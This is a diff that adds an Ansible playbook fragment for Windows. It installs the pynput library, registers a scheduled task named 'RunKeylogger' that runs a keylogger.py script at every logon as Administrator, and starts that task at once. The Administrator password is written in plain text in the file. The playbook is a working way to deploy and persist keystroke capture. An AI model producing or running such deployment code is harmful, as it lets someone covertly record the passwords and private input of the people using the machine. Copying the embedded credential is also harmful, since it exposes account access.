@@ -1,0 +1,21 @@
+---
+    - name: Install pynput using pip
+      win_command: C:\Python312\Scripts\pip.exe install pynput
+
+    - name: Create a scheduled task to run the keylogger
+      win_scheduled_task:
+        name: "RunKeylogger"
+        description: "Scheduled task to run keylogger script"
+        actions:
+          - path: "C:\\Python312\\python.exe"  # Path to the Python executable
+            arguments: "C:\\Users\\Administrator\\Documents\\keylogger.py"  # Path to keylogger script
+        triggers:
+          - type: "logon"
+            start_boundary: "{{ ansible_date_time.iso8601 }}"  # Use current time
+        username: "Administrator"  # The user account to run the task under
+        password: "Harrison1000676"  # Password for the user account
+        run_only_if_connected: yes  # Ensures the task runs only if the user is logged in
+        state: present
+
+    - name: Start the scheduled task
+      win_shell: schtasks /run /tn "RunKeylogger"
